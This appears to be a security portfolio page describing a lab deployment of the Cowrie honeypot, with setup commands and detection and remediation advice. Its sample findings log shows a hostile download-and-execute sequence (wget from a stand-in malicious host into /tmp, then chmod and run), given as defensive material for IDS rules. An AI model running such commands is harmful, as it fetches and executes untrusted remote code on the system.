<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cowrie Honeypot - Christian Galvez</title>
  <link rel="stylesheet" href="../assets/styles.css">
  <style>
    main { max-width:900px; margin:30px auto; padding:0 20px; }
    pre { background:#f3f4f6; padding:12px; overflow:auto; border-radius:6px; }
    .artifact-list a { color:#003366; }
    .meta { color:#666; font-size:0.95rem; margin-bottom:8px; }
  </style>
</head>
<body>
  <!-- Navbar -->
  <header class="navbar">
    <nav>
      <ul>
        <li><a href="../index.html">Home</a></li>
        <li><a href="../about.html">About</a></li>
        <li><a href="../projects.html">Projects</a></li>
        <li><a href="../contact.html">Contact</a></li>
      </ul>
    </nav>
  </header>

  <main>
    <section class="hero">
      <h1>Cowrie Honeypot Deployment</h1>
      <p><strong>One-line summary:</strong> Deployed Cowrie SSH/Telnet honeypot to capture attacker behavior, harvest IoCs, and test logging/alerting pipelines.</p>
    </section>

    <section>
      <p class="meta"><strong>Role:</strong> Lab implementer / detection engineer &nbsp; | &nbsp; <strong>Tools:</strong> Cowrie, Python, Docker, Ubuntu 22.04, Fail2Ban, Elastic Stack (optional)</p>
    </section>

    <section>
      <h2>Objective</h2>
      <p>Run a low-interaction SSH/Telnet honeypot to collect attacker commands, payloads, and indicators of compromise. Validate log ingestion into SIEM and produce actionable detections.</p>
    </section>

    <section>
      <h2>Minimal topology</h2>
      <pre>
Host (management) - 10.0.2.10
Cowrie Honeypot VM/container - 10.0.2.20 (exposed on SSH/Telnet ports)
Optional: Log collector (Elastic/Logstash/Beats) - 10.0.2.30
      </pre>
      <p>For a hardened production-style test, isolate honeypot on host-only or VLAN and block outbound http/ftp to prevent actual data exfiltration.</p>
    </section>

    <section>
      <h2>Deployment steps (concise)</h2>
      <ol>
        <li>Provision Ubuntu 22.04 VM (or container host).</li>
        <li>Install dependencies (Python3, virtualenv, git): 
          <pre><code>sudo apt update && sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev build-essential</code></pre>
        </li>
        <li>Clone Cowrie and create venv:
          <pre><code>git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt</code></pre>
        </li>
        <li>Copy sample config and edit `cowrie.cfg` (set ssh/telnet ports, logging destinations):
          <pre><code>cp etc/cowrie.cfg.dist etc/cowrie.cfg
# edit etc/cowrie.cfg - set [ssh], [telnet], logging, and enabled sensors</code></pre>
        </li>
        <li>Start Cowrie:
          <pre><code>bin/cowrie start</code></pre>
          Or for Docker: use the project's Dockerfile or a vetted container image and mount `cowrie.cfg` and `data` for persistence.
        </li>
        <li>Forward logs to your collector (optional):
          <pre><code># Example: configure Filebeat to send cowrie log files to Logstash/Elastic</code></pre>
        </li>
      </ol>
    </section>

    <section>
      <h2>Example artifacts (what to capture)</h2>
      <ul class="artifact-list">
        <li><a href="../assets/cowrie-session.log" target="_blank">cowrie session logs (upload)</a></li>
        <li><a href="../assets/cowrie-commands.txt" target="_blank">harvested commands (txt)</a></li>
        <li><a href="../assets/cowrie-sample-ioct.json" target="_blank">sample IOC export (JSON)</a></li>
      </ul>
      <p>Upload these into <code>/assets</code> and keep names exact or edit links accordingly.</p>
    </section>

    <section>
      <h2>Findings & examples</h2>
      <p>Typical attacker behavior collected:</p>
      <pre><code>2025-07-01T12:34:56Z - ssh login attempt - user: root - pass: admin
2025-07-01T12:35:12Z - executed: wget http://malicious.example/payload -O /tmp/p
2025-07-01T12:35:45Z - executed: chmod +x /tmp/p; /tmp/p</code></pre>
      <p>These give you IPs, domains, and exact commands you can use to write IDS rules and blocking policies.</p>
    </section>

    <section>
      <h2>Detection & remediation</h2>
      <ul>
        <li>Create IDS signatures for common command patterns and download URLs captured by Cowrie.</li>
        <li>Block or sinkhole malicious domains at DNS/edge when confirmed.</li>
        <li>Throttle/blacklist repeated brute-force sources using firewall rules and Fail2Ban.</li>
      </ul>
    </section>

    <section>
      <h2>Safety and ethics</h2>
      <p>Run honeypots in isolated networks and never forward captured malware to production systems. Ensure legal/acceptable use and that your lab cannot be used to pivot to external targets.</p>
    </section>

    <section>
      <h2>TL;DR (for hiring managers)</h2>
      <ul>
        <li>Deployed Cowrie to capture attacker TTPs and artifacts.</li>
        <li>Produced logs and IOCs used to create detection rules and blocking lists.</li>
        <li>All work done in isolated lab; artifacts available for review.</li>
      </ul>
    </section>
  </main>

  <footer>
    <p>Â© 2025 Christian Galvez</p>
  </footer>
</body>
</html>